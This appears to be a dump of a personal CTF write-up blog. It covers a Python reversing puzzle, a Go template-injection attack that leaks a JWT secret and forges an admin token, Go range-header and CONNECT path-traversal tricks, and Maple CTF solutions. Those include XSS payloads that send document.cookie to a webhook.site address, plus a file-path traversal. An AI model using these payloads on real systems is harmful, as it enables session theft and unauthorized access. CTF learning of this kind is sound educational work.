<p><img data-src="/./images/trendmirco-2021-rev-1-100-PyPuzzle/Untitled.png" alt="Untitled"></p>
<p>So first we need find the source code.</p>
<p><img data-src="/./images/trendmirco-2021-rev-1-100-PyPuzzle/Untitled1.png" alt="Untitled"></p>
<span id="more"></span>

<p>The source code is in <code>pypuzzle.pyc</code> and the python version is python3.7 according to <code>python37.dll</code> </p>
<p><img data-src="/./images/trendmirco-2021-rev-1-100-PyPuzzle/Untitled2.png" alt="Untitled"></p>
<p>Due to bytecode header, using decompyle3 will show error.</p>
<p>So, in order to decompile, we need to bytecode header first.</p>
<ol>
<li>unzip base_library.zip, open any file using hex editor</li>
<li>open <a href="http://pypuzzle.py/">PyPuzzle.py</a> suing hex editor</li>
</ol>
<p>not that, the file in base_library contains bytecode header. which is <code>42 0D 0D 0A 01 00 00 00</code> for python 3.7</p>
<p><img data-src="/./images/trendmirco-2021-rev-1-100-PyPuzzle/Untitled3.png" alt="Untitled"></p>
<p><img data-src="/./images/trendmirco-2021-rev-1-100-PyPuzzle/Untitled4.png" alt="Untitled"></p>
<ol>
<li>we need add <code>42 0D 0D 0A 01 00 00 00</code> to the <a href="http://pypuzzle.py/">PyPuzzle.py</a> file and remove extra 0s</li>
</ol>
<p><img data-src="/./images/trendmirco-2021-rev-1-100-PyPuzzle/Untitled5.png" alt="Untitled"></p>
<ol>
<li>save <a href="http://pypuzzle.py/">PyPuzzle.py</a> and decompile again.</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.10 (default, Jun  2 2021, 10:49:15)</span></span><br><span class="line"><span class="comment"># [GCC 9.4.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: PyPuzzle.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1975-05-06 10:59:01</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#....ignoreed</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        slideTo = <span class="literal">None</span></span><br><span class="line">        msg = <span class="string">&#x27;Click tile or press arrow keys to slide.&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> mainBoard == SOLVEDBOARD:</span><br><span class="line">            msg = <span class="string">&#x27;Solved! But Wait you need to decrypt the flag *_^&#x27;</span></span><br><span class="line">            flag = <span class="string">&#x27;3blKlvIKqQoG0D6B4XDcZxQjbLbg4KVJQzbm8b&#x27;</span></span><br><span class="line"><span class="comment">#....ignoreed</span></span><br></pre></td></tr></table></figure>

<p>use <code>ciphey</code> to get the flag. FU trendmicro.</p>
<p><img data-src="/./images/trendmirco-2021-rev-1-100-PyPuzzle/Untitled6.png" alt="Untitled"></p>
]]></content>
  </entry>
  <entry>
    <title>Angstrom CTF 2022</title>
    <url>/ctf-writeup/2022/angstrom/index.html</url>
    <content><![CDATA[<h1 id="Angstrom-CTF-2022"><a href="#Angstrom-CTF-2022" class="headerlink" title="Angstrom CTF 2022"></a>Angstrom CTF 2022</h1><p><a href="https://2022.angstromctf.com/">https://2022.angstromctf.com/</a></p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./pwn/whatsmyname">[pwn] whatsmyname</a></li>
<li><a href="./pwn/wah">[pwn] wah</a></li>
<li><a href="./pwn/whereami">[pwn] whereami</a></li>
<li><a href="./pwn/really_obnoxious_problem">[pwn] really obnoxious problem</a></li>
<li><a href="./pwn/caniride">[pwn] caniride</a></li>
<li><a href="./pwn/parity">[pwn] parity</a></li>
<li><a href="./pwn/dreams">[pwn] dreams</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Asis CTF 2022 Qualification</title>
    <url>/ctf-writeup/2022/asisctfqual/index.html</url>
    <content><![CDATA[<h1 id="Asis-CTF-2022-Qualification"><a href="#Asis-CTF-2022-Qualification" class="headerlink" title="Asis CTF 2022 Qualification"></a>Asis CTF 2022 Qualification</h1><p><a href="https://asisctf.com/">https://asisctf.com/</a></p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./pwn/baby_scan_1">[pwn] Baby scan I</a></li>
<li><a href="./pwn/baby_scan_2">[pwn] Baby scan II</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Cake CTF 2022</title>
    <url>/ctf-writeup/2022/cakectf/index.html</url>
    <content><![CDATA[<h1 id="Cake-CTF-2022"><a href="#Cake-CTF-2022" class="headerlink" title="Cake CTF 2022"></a>Cake CTF 2022</h1><p><a href="https://2022.cakectf.com/">https://2022.cakectf.com/</a></p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./c-sandbox">[misc] C-Sandbox</a></li>
<li><a href="./str_vs_cstr">[pwn] str.vs.cstr</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Bo1lers CTF 2022</title>
    <url>/ctf-writeup/2022/bo1lers/index.html</url>
    <content><![CDATA[<h1 id="Tamu-CTF-2022"><a href="#Tamu-CTF-2022" class="headerlink" title="Tamu CTF 2022"></a>Tamu CTF 2022</h1><p><a href="https://ctf.b01lers.com/">https://ctf.b01lers.com/</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>1 place (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./pwn/gambler-baby">[pwn] gambler-baby</a></li>
<li><a href="./pwn/gambler-overflow">[pwn] gambler-overflow</a></li>
<li><a href="./pwn/gambler-supreme">[pwn] gambler-supreme</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>CSAW CTF Final 2022</title>
    <url>/ctf-writeup/2022/csawfinal/index.html</url>
    <content><![CDATA[<h1 id="CSAW-CTF-Final-2022"><a href="#CSAW-CTF-Final-2022" class="headerlink" title="CSAW CTF Final 2022"></a>CSAW CTF Final 2022</h1><p><a href="https://ctf.csaw.io/">https://ctf.csaw.io/</a></p>
<p>Official Repo: <a href="https://github.com/osirislab/CSAW-CTF-2022-Final-WriteUps">https://github.com/osirislab/CSAW-CTF-2022-Final-WriteUps</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>29th(All region)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./rev/cube/">[rev] cube</a></li>
<li><a href="./misc/MeMbrEy0_LEaK/">[misc] MeMbrEy0 LEaK</a></li>
<li><a href="./misc/SupEr_GUeSsEr_Game/">[misc] SupEr GUeSsEr G@me</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>CSAW CTF Qual 2022</title>
    <url>/ctf-writeup/2022/csawqual/index.html</url>
    <content><![CDATA[<h1 id="CSAW-CTF-Qual-2022"><a href="#CSAW-CTF-Qual-2022" class="headerlink" title="CSAW CTF Qual 2022"></a>CSAW CTF Qual 2022</h1><p><a href="https://ctf.csaw.io/">https://ctf.csaw.io/</a></p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><p>29th(All region)&#x2F;12th(US-Canada) (<a href="https://ctftime.org/team/73723">MapleBacon</a>)</p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./web/world-wide-web/">[web] Word Wide Web</a></li>
<li><a href="./pwn/ezROP">[pwn] ezROP</a></li>
<li><a href="./pwn/how2pwn">[pwn] how2pwn</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Line CTF 2022</title>
    <url>/ctf-writeup/2022/linectf/index.html</url>
    <content><![CDATA[<h1 id="Line-CTF-2022"><a href="#Line-CTF-2022" class="headerlink" title="Line CTF 2022"></a>Line CTF 2022</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./line-ctf-2022-web-gotm-ssti">[web] gotm-ssti</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>[web] gotm (golang ssti) [line ctf 2022]</title>
    <url>/ctf-writeup/2022/linectf/line-ctf-2022-web-gotm-ssti.html</url>
    <content><![CDATA[<h1 id="0x1-tl-dr"><a href="#0x1-tl-dr" class="headerlink" title="0x1 tl;dr"></a>0x1 tl;dr</h1><p>gotm, a web question in linectf 2022. This is a very good example of golang <strong>server side template injection (ssti)</strong></p>
<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>take a brief a look at the code. In order to get the flag. we need to visit <code>/flag</code> whici is handled by <code>flag_handler</code>. </p>
<p><code>flag_handler</code> require a jwt token with <code>IsAdmin=True</code>. Therefore, in order to forge that, we need to have the secret of jwt token.</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func flag_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    token := r.Header.Get(&quot;X-Token&quot;)</span><br><span class="line">    if token != &quot;&quot; &#123;</span><br><span class="line">        id, is_admin := jwt_decode(token)</span><br><span class="line">        if is_admin == true &#123;</span><br><span class="line">            // write flag</span><br><span class="line">            return</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            w.WriteHeader(http.StatusForbidden)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Then, the problem become how to get the jwt token from the server. </p>
<p>In order to get the jwt secret, we need to use a ssti vulnerable in the <code>root_handler</code>. </p>
<p><code>root_handler</code> first obtain a <code>Account</code> struct from the token and print out the user id using template rendering. </p>
<p>Since we can control the value in <code>acc.id</code> by register an account. We can inject arbitrary code into the template.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Account struct &#123;</span><br><span class="line">    id         string</span><br><span class="line">    pw         string</span><br><span class="line">    is_admin   bool</span><br><span class="line">    secret_key string</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">func root_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    ...</span><br><span class="line">    acc := get_account(id)</span><br><span class="line">    ...</span><br><span class="line">    tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)</span><br><span class="line">    ...</span><br><span class="line">    return</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x3-Some-useful-go-ssti-injection"><a href="#0x3-Some-useful-go-ssti-injection" class="headerlink" title="0x3 Some useful go ssti injection"></a>0x3 Some useful go ssti injection</h1><ol>
<li><code>&#123;&#123;.&#125;&#125;</code> will print out the whole struct that being passed</li>
<li><code>&#123;&#123;.PublicField&#125;&#125;</code>  will print out the public field</li>
<li><code>&#123;&#123;printf "%s" "asdf"&#125;&#125;</code> will do a normal printf thing</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;text/template&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type SSTI struct &#123;</span><br><span class="line">    privateMember         string</span><br><span class="line">    PublicMember         string</span><br><span class="line">    value   int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    ssti := SSTI&#123;</span><br><span class="line">        privateMember : &quot;private&quot;,</span><br><span class="line">        PublicMember : &quot;public&quot;,</span><br><span class="line">        value : 1,</span><br><span class="line">    &#125;</span><br><span class="line">    tpl, _ := template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;.&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is &#123;private public 1&#125;&quot;</span><br><span class="line">    tpl, _ = template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;.PublicMember&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is public&quot;</span><br><span class="line">    tpl, _ = template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;printf \&quot;%s\&quot; \&quot;asdf\&quot;&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is asdf&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Solution"><a href="#0x4-Solution" class="headerlink" title="0x4 Solution"></a>0x4 Solution</h1><ol>
<li>register as userid &#x3D;  <code>&#123;&#123;.&#125;&#125;</code> using <code>/regist</code></li>
<li>get token using <code>/auth</code> to get a token</li>
<li>using this token to get jwt secret (which is <code>fasdf972u1031xu90zm10Av</code>)</li>
<li>using the jwt secret to forget a jwt token.</li>
<li>get the flag</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl --request GET &#x27;http://34.146.226.125/regist?id=%7B%7B%2E%7D%7D1&amp;pw=asdf&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;msg&quot;:&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ curl --request GET &#x27;http://34.146.226.125/auth?id=%7B%7B%2E%7D%7D&amp;pw=asdf&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ curl --header &#x27;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM&#x27; --request GET &#x27;http://34.146.226.125/&#x27;</span><br><span class="line">Logged in as &#123;&#123;&#123;.&#125;&#125; asdf false fasdf972u1031xu90zm10Av&#125;</span><br><span class="line"></span><br><span class="line">$ curl --header &#x27;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTY0ODUyMjgzMn0.nsbn28xiVYZkPPJqAJYv01PEGYuugWBIyriBaB7hcIY&#x27; --request GET &#x27;http://34.146.226.125/flag&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;msg&quot;:&quot;Hi &#123;&#123;.&#125;&#125;, flag is LINECTF&#123;country_roads_takes_me_home&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Magpie CTF 2022</title>
    <url>/ctf-writeup/2022/magpiectf/index.html</url>
    <content><![CDATA[<h1 id="Magpie-CTF-2022"><a href="#Magpie-CTF-2022" class="headerlink" title="Magpie CTF 2022"></a>Magpie CTF 2022</h1><h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./magpie-ctf-2020-writeup">writeup</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>[web] a replication of go-fs [magpie ctf]</title>
    <url>/ctf-writeup/2022/magpiectf/magpie-ctf-2020-writeup.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>I participate magpie ctf a few weeks ago. Our team go 2nd place, which is pretty good. And we also got $512 (102 for each team members) for reward of getting 2nd</p>
<p>Anyway, there is a question in the magpie ctf called &quot;our file belong to us&quot; <a href="https://github.com/infosec-ucalgary/magpieCTF2022-public/tree/main/challenges/web/our_files_are_belong_only_to_us">[linkhere]</a></p>
<p>This is a pretty fun challenge I got a solution for.</p>
<p>Sadly, this challenge copy just paste code from another challenge called &quot;go-fs&quot; back in justifyCTF2020 with additional jwt authentication. but the basic idea is the same :(</p>
<span id="more"></span>

<h1 id="0x1-exploit-explaination"><a href="#0x1-exploit-explaination" class="headerlink" title="0x1 exploit explaination"></a>0x1 exploit explaination</h1><p>the basic idea is, this web challenge implement a custom file system. And the read&#x2F;seek function use offset to locate a file. combine with a bug for range header founded in go 1.15. We can acess a file which is not intended to.</p>
<p>We want to access a file called <code>a_secret.bak</code> in order to get the secret for jwt token. However, the access to the file has been block by this code.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.HandleFunc(&quot;/a_secret.bak&quot;, func(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	w.Header().Set(&quot;Served-by&quot;, VERSION)</span><br><span class="line">	w.Write([]byte(`Error: Access to secret key only for authorized users.`))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>according to original authors report (<a href="https://github.com/golang/go/issues/40940">https://github.com/golang/go/issues/40940</a>). go 1.15 wrongly parse <code>range</code> header. Which allow go to read with a negative length of file.</p>
<p>In the customer file system. the negative read means it will read next file. (the file are consective in the memory)</p>
<p>therefore, to read <code>a_secret.bak</code>. the request a file right before the <code>a_scret.bak</code> with header <code>Range: bytes=--1</code></p>
<p><code>curl -H &#39;Range: bytes=--1&#39; </code></p>
<p>After we got the flag, it is just crafting a jwt token and login into the system to get the flag.</p>
<h1 id="0x2-unintended-solution"><a href="#0x2-unintended-solution" class="headerlink" title="0x2 unintended solution"></a>0x2 unintended solution</h1><p>there is also another way to solve this challenge, which is related to the go implementation of the http <code>CONNECT</code> method.</p>
<p>in normal get&#x2F;post, go will do a operation called <strong>canonicalization</strong>, which means if we type like <code>../flag</code>, the go will redirect us to <code>/flag</code>. </p>
<p>However, if we do a <code>CONNECT</code> request, according to the go source code (<a href="https://github.com/golang/go/blob/9bb97ea047890e900dae04202a231685492c4b18/src/net/http/server.go#L2354-L2364">here</a>), it will pass the path as is</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// CONNECT requests are not canonicalized.</span><br><span class="line">	if r.Method == &quot;CONNECT&quot; &#123;</span><br><span class="line">		// If r.URL.Path is /tree and its handler is not registered,</span><br><span class="line">		// the /tree -&gt; /tree/ redirect applies to CONNECT requests</span><br><span class="line">		// but the path canonicalization does not.</span><br><span class="line">		if u, ok := mux.redirectToPathSlash(r.URL.Host, r.URL.Path, r.URL); ok &#123;</span><br><span class="line">			return RedirectHandler(u.String(), StatusMovedPermanently), u.Path</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return mux.handler(r.Host, r.URL.Path)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>In this case, if we do a <code>CONNECT</code> request with <code>../flag</code>, we can access <code>../flag</code> directly in the file system instead of checking the jwt.</p>
<p>solution: <code>curl --path-as-is -X CONNECT http://localhost/../flag</code></p>
]]></content>
  </entry>
  <entry>
    <title>Nahamcon CTF 2022</title>
    <url>/ctf-writeup/2022/nahamcon/index.html</url>
    <content><![CDATA[<h1 id="Nahamcon-CTF-2022"><a href="#Nahamcon-CTF-2022" class="headerlink" title="Nahamcon CTF 2022"></a>Nahamcon CTF 2022</h1><p><a href="https://ctf.nahamcon.com/">https://ctf.nahamcon.com/</a></p>
<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./warmup/flagcat">[warmup&amp;rev] flagcat</a></li>
<li><a href="./warmup/crash_override">[warmup&amp;pwn] crash_override</a></li>
<li><a href="./pwn/detour">[pwn] detour</a></li>
<li><a href="./pwn/reading_list">[pwn] reading_list</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Sapling CTF 2022</title>
    <url>/ctf-writeup/2022/saplingctf/index.html</url>
    <content><![CDATA[<h1 id="Sapling-CTF-2022"><a href="#Sapling-CTF-2022" class="headerlink" title="Sapling CTF 2022"></a>Sapling CTF 2022</h1><p>UBC internal CTF competition</p>
<h1 id="Rank"><a href="#Rank" class="headerlink" title="Rank"></a>Rank</h1><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul>
<li><a href="./sapling-ctf-2022-write-up">writeup</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>[writeup] Maple CTF 2022</title>
    <url>/ctf-writeup/2022/saplingctf/sapling-ctf-2022-write-up.html</url>
    <content><![CDATA[<h1 id="0x0-Introudction"><a href="#0x0-Introudction" class="headerlink" title="0x0 Introudction"></a>0x0 Introudction</h1><p>Maple CTF, which is first CTF event hold by Maple Bacon Team. Because it is the first CTF MapleBacon organzie a CTF event. This event is only open for current university students.</p>
<p>Since most of senior team member and main team member didn&#39;t participate CTF (because they are in charge of design problems), I was able to get a very good position when ctf ends.</p>
<p>Since I only knows about pwn, for other category question, I basically OSINT, just search google for similar question and look its writeup.</p>
<p>But I actually learned a lot during the event. <strong>AND</strong></p>
<p>I get 2nd in individual and 3rd in team. Yeah!!!!!!!!!!!!!!!!!!</p>
<span id="more"></span>

<p><img data-src="/./uploads/2022-01-28_223328.jpg" alt="2022-01-28_223328"></p>
<p><img data-src="/./uploads/2022-01-28_223354.jpg" alt="2022-01-28_223354.jpg"></p>
<h1 id="0x1-problems-I-solved"><a href="#0x1-problems-I-solved" class="headerlink" title="0x1 problems I solved"></a>0x1 problems I solved</h1><p>some challenge are pretty simple and straight forward, so I will only do simple write up.</p>
<p>But some question is very interesting, i highly recommend to take look at these challenge: <strong>pyjail</strong>, <strong>uwu-intewpwetew</strong>, <strong>birbs</strong>, <strong>pwintf</strong>, and most of the crypto question</p>
<p><strong>rev</strong></p>
<ul>
<li><a href="#plain">plain</a></li>
<li><a href="#keys">Keys</a><br><strong>web</strong></li>
<li><a href="#Doot-Doot">Doot Doot</a></li>
<li><a href="#Color-Me">Color Me</a></li>
<li><a href="#Poem-Me">Poem Me</a></li>
<li><a href="#Super-Cereal">Super Cereal</a><br><strong>misc</strong></li>
<li><a href="#CTF-Adventure-Land-1">CTF Adventure Land 1</a></li>
<li><a href="#Cutoff">Cutoff</a></li>
<li><a href="#What-Is-A-Word">What Is A Word</a></li>
<li><a href="#Pyjail">Pyjail 1 &amp; 2 &amp; 3</a></li>
<li><a href="#Hijacked">Hijacked!</a><br><strong>crypto</strong></li>
<li><a href="#Factor-Me">Factor Me</a></li>
<li><a href="#Too-Large-to-Factor">Too Large to Factor</a></li>
<li><a href="#Copilot-my-savior">Copilot-my-savior</a></li>
<li><a href="#Blindfolded">Blindfolded</a></li>
<li><a href="/2022/01/30/ctf/maplectf2022/maplectf2022-crypto-timing-attack/">Bit by Bit</a></li>
<li><a href="#Cut-and-paste">Cut and paste</a></li>
<li><a href="#One-two-three">One two three</a></li>
<li><a href="#Propagation">Propagation</a><br><strong>pwn</strong></li>
<li><a href="#memowy-cowwuption">memowy cowwuption</a></li>
<li><a href="#wetuwn-addwess">wetuwn addwess</a></li>
<li><a href="#wetuwn-owiented-pwogwamming">wetuwn owiented pwogwamming</a></li>
<li><a href="#wetuwn-to-wibc">wetuwn to wibc</a></li>
<li><a href="#uwu-intewpwetew">uwu intewpwetew</a></li>
<li><a href="/2022/01/30/ctf/maplectf2022/maplectf2022-pwn-bruteforcing-canary/">birbs</a></li>
<li><a href="/2022/02/02/ctf/how-to-utilize-printf-in-pwn/">baby pwintf</a></li>
<li><a href="/2022/02/02/ctf/how-to-utilize-printf-in-pwn/">pwintf</a></li>
</ul>
<h1 id="0x2-Reverse"><a href="#0x2-Reverse" class="headerlink" title="0x2 Reverse"></a>0x2 Reverse</h1><p>I didn&#39;t do much question in reverse because I&#39;m too lazy to look at disassemble code, i just do some pretty straight forward question</p>
<h2 id="plain"><a href="#plain" class="headerlink" title="plain"></a>plain</h2><p>the challenge provide an binary called <code>plain</code></p>
<p>pretty straight forward, the flag is encoded in the binary. Using disassemble to check the code or just <code>strings plain</code> to get the flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(pyenv) aynakeya@LAPTOP-T6NBK8L5:~/ctf/maplectf2022/plain$ strings plain </span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">...</span><br><span class="line">maple&#123;binaries_are_not_secret&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{binaries_are_not_secret}</p>
<h2 id="keys"><a href="#keys" class="headerlink" title="keys"></a>keys</h2><p>check the binary with a decompiler, you will found that it takes the user input and XOR with a 4 byte array. It takes the xor result and compare with a bigger array. If all the bytes are same, it is the flag we want to know.</p>
<p>So, since X ^ b ^ b &#x3D;&#x3D; X, we just xor to get the flag.</p>
<p>here is the solution</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">mystery_bytes = [0x4a,0x83,0x04,0xd5]</span><br><span class="line">mystery_str = &quot;27e274b92ff870bd79dc4f9013dc4d8615cb30870ec0349179e75be424dc509d0fdc46e424b776ac37&quot;</span><br><span class="line">mystery_bytes_2 = [int(mystery_str[i:i+2],16) for i in range(0,len(mystery_str),2)]</span><br><span class="line"></span><br><span class="line">index = 0</span><br><span class="line">for index,s in enumerate(mystery_bytes_2):</span><br><span class="line">    print(chr(s^mystery_bytes[index &amp; 3]),end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">print()</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{th3_KEY_IS_H4RDC0D3d_1n_THE_B1n4ry}</p>
<h1 id="0x3-web"><a href="#0x3-web" class="headerlink" title="0x3 web"></a>0x3 web</h1><p>most of web I solved is related to XSS. This is the actually the first time I got an opportunity solve challenges related to XSS.</p>
<hr>
<h2 id="Doot-Doot"><a href="#Doot-Doot" class="headerlink" title="Doot Doot"></a>Doot Doot</h2><p>server.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/oot&#x27;)</span><br><span class="line">def owo():</span><br><span class="line">    f = request.args.get(&#x27;oot&#x27;)</span><br><span class="line">    f = f + &#x27;.txt&#x27;</span><br><span class="line">    directories.append(f)</span><br><span class="line">    filename = &#x27;/&#x27;.join(directories)</span><br><span class="line">    try:</span><br><span class="line">        with open(filename, &#x27;r&#x27;) as filename:</span><br><span class="line">            file_content = filename.read(-1)</span><br><span class="line">    except:</span><br><span class="line">        file_content = &quot;INVALID FACT&quot;</span><br><span class="line">    finally:</span><br><span class="line">        directories.pop()</span><br><span class="line">    return render_template(&quot;portfolio.html&quot;, oot=file_content)</span><br></pre></td></tr></table></figure>

<p>so, just go to &#x2F;oot?oot&#x3D;..&#x2F;flag to get the flag</p>
<p><strong>flag</strong>: maple{Pingu_s4yz_N00t_No0T}</p>
<hr>
<h2 id="Color-Me"><a href="#Color-Me" class="headerlink" title="Color Me"></a>Color Me</h2><p>pretty straight forward question, it allow you to load arbitray html code into the page. And admin will visit the page.</p>
<p>XSS scripts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;$.get(&quot;https://webhook.site/7b7b96e8-2831-41da-8997-b7c55b4f75ca?&quot;+document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{0ops_i_f0rgot_about_xss}</p>
<hr>
<h2 id="Poem-Me"><a href="#Poem-Me" class="headerlink" title="Poem Me"></a>Poem Me</h2><p>similar to color me, the main difference is it filter out <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code></p>
<p>the solution is also simple, replace <code>&lt;script&gt;</code> with <code>&lt;script nounce=&quot;a&quot;&gt;</code>, <code>&lt;/script&gt;</code> with <code>&lt;/script/&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script/&gt;&lt;script a&gt;$.get(&quot;https://webhook.site/7b7b96e8-2831-41da-8997-b7c55b4f75ca?&quot;%2Bdocument.cookie);&lt;/script/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{why_m4ke_ur_0wn_5anitizers_wh3n_D0mpur1fy_ex1sts}</p>
<hr>
<h2 id="Super-Cereal"><a href="#Super-Cereal" class="headerlink" title="Super Cereal"></a>Super Cereal</h2><p>the main exploits here is it use unserialize</p>
<p>server.js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// get secret</span><br><span class="line">app.get(&#x27;/secret&#x27;, function(req, res) &#123;</span><br><span class="line">  if (req.cookies.profile)&#123;</span><br><span class="line">  const str = new Buffer(req.cookies.profile, &#x27;base64&#x27;).toString();</span><br><span class="line">  const obj = nodeSerial.unserialize(str);</span><br><span class="line">  if (obj.cereal)&#123;</span><br><span class="line">    const cereal = escape(obj.cereal);</span><br><span class="line">    res.render(&#x27;pages/secret&#x27;, &#123;</span><br><span class="line">    favcereal: cereal</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  res.render(&#x27;pages/secret&#x27;, &#123;</span><br><span class="line">    favcereal: &quot;&quot;</span><br><span class="line">    &#125;);</span><br><span class="line">  